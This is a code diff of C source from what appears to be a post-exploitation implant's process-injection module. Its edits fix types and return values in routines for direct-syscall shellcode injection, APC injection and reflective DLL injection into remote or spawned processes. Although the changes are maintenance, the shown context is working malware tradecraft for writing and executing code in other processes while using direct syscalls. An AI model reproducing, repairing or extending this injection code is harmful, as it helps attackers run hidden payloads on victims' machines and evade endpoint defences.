@@ -51,8 +51,8 @@ BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes
                                 InitializeObjectAttributes( &ObjectAttributes, NULL, 0, NULL, NULL );
 
                                 // set the correct pid and tid
-                                ProcClientID.UniqueProcess = ( HANDLE ) ctx->ProcessID;
-                                ProcClientID.UniqueThread  = ( HANDLE ) threadId;
+                                ProcClientID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) ctx->ProcessID;
+                                ProcClientID.UniqueThread  = ( HANDLE ) ( ULONG_PTR ) threadId;
 
                                 Instance.Syscall.NtOpenThread( &ctx->hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &ProcClientID );
 
@@ -172,22 +172,24 @@ BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes
             }
         }
     }
+
+    return TRUE;
 }
 
 BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx )
 {
     NTSTATUS NtStatus        = 0;
     LPVOID   lpVirtualMemory = NULL;
-    ULONG    OldProtection   = 0;
     PVOID    ShellcodeArg    = NULL;
     BOOL     Success         = FALSE;
+    SIZE_T   BytesWritten    = 0;
 
     if ( ctx->Parameter )
     {
         ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, ctx->hProcess, ctx->ParameterSize, PAGE_READWRITE );
         if ( ShellcodeArg )
         {
-            NtStatus = Instance.Syscall.NtWriteVirtualMemory( ctx->hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &OldProtection );
+            NtStatus = Instance.Syscall.NtWriteVirtualMemory( ctx->hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &BytesWritten );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "[-] NtWriteVirtualMemory: Failed" )
@@ -250,7 +252,7 @@ BOOL ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T 
     NTSTATUS    NtStatus        = 0;
     DWORD       DosError        = 0;
     LPVOID      lpVirtualMemory = NULL;
-    ULONG       OldProtection   = 0;
+    SIZE_T      BytesWritten    = 0;
     PVOID       ShellcodeArg    = NULL;
 
     if ( ctx->Parameter )
@@ -258,7 +260,7 @@ BOOL ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T 
         ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, hProcess, ctx->ParameterSize, PAGE_READWRITE );
         if ( ShellcodeArg )
         {
-            NtStatus = Instance.Syscall.NtWriteVirtualMemory( hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &OldProtection );
+            NtStatus = Instance.Syscall.NtWriteVirtualMemory( hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &BytesWritten );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "[-] NtWriteVirtualMemory: Failed" )
@@ -277,7 +279,7 @@ BOOL ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T 
         {
             PUTS("[+] Moved memory: Successful")
 
-            // NtStatus = Instance.Syscall.NtProtectVirtualMemory( hProcess, &lpVirtualMemory, &ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );
+            // NtStatus = Instance.Syscall.NtProtectVirtualMemory( hProcess, &lpVirtualMemory, &ShellcodeSize, PAGE_EXECUTE_READ, &BytesWritten );
             if ( MemoryProtect( DX_MEM_SYSCALL, hProcess, lpVirtualMemory, ShellcodeSize, PAGE_EXECUTE_READ ) )
             {
                 PUTS("[+] MemoryProtect: Successful")
@@ -329,9 +331,9 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     DWORD    MemRegionSize       = 0;
     DWORD    ReflectiveLdrOffset = 0;
     ULONG    FullDllSize         = 0;
-    DWORD    OldProtect          = 0;
     BOOL     HasRDll             = FALSE;
     DWORD    ReturnValue         = 0;
+    SIZE_T   BytesWritten        = 0;
 
     if( ! DllBuffer || ! DllLength || ! hTargetProcess )
     {
@@ -386,7 +388,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
         if ( MemParamsBuffer )
         {
             PRINTF( "MemoryAlloc: Success allocated memory for parameters: ptr:[%p]\n", MemParamsBuffer )
-            NtStatus = Instance.Syscall.NtWriteVirtualMemory( hTargetProcess, MemParamsBuffer, Parameter, ParamSize, &OldProtect );
+            NtStatus = Instance.Syscall.NtWriteVirtualMemory( hTargetProcess, MemParamsBuffer, Parameter, ParamSize, &BytesWritten );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "NtWriteVirtualMemory: Failed to write memory for parameters" )
@@ -411,7 +413,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     if ( MemLibraryBuffer )
     {
         PUTS( "[+] NtAllocateVirtualMemory: success" );
-        if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &OldProtect ) ) )
+        if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &BytesWritten ) ) )
         {
             // TODO: check to get the .text section and size of it
             PRINTF( "[+] NtWriteVirtualMemory: success: ptr[%p]\n", MemLibraryBuffer );
@@ -419,7 +421,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
             ReflectiveLdr = RVA( LPVOID, MemLibraryBuffer, ReflectiveLdrOffset );
             MemRegion     = MemLibraryBuffer - ( ( ( UINT_PTR ) MemLibraryBuffer ) % 8192 );    // size of shellcode? change it to rx
             MemRegionSize = 16384;
-            OldProtect    = 0;
+            BytesWritten    = 0;
 
             // NtStatus = Instance.Syscall.NtProtectVirtualMemory( hTargetProcess, &MemRegion, &MemRegionSize, PAGE_EXECUTE_READ, &OldProtect );
             if ( MemoryProtect( DX_MEM_SYSCALL, hTargetProcess, MemRegion, MemRegionSize, PAGE_EXECUTE_READ ) )
@@ -475,7 +477,7 @@ DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWO
     PRINTF( "Params( %x, %d, %x )\n", DllBuffer, DllLength, ctx );
 
     PROCESS_INFORMATION ProcessInfo = { 0 };
-    PCHAR               SpawnProc   = NULL;
+    PWCHAR              SpawnProc   = NULL;
     DWORD               Result      = 0;
 
     if ( GetPeArch( DllBuffer ) == PROCESS_ARCH_X86 ) // check if dll is x64
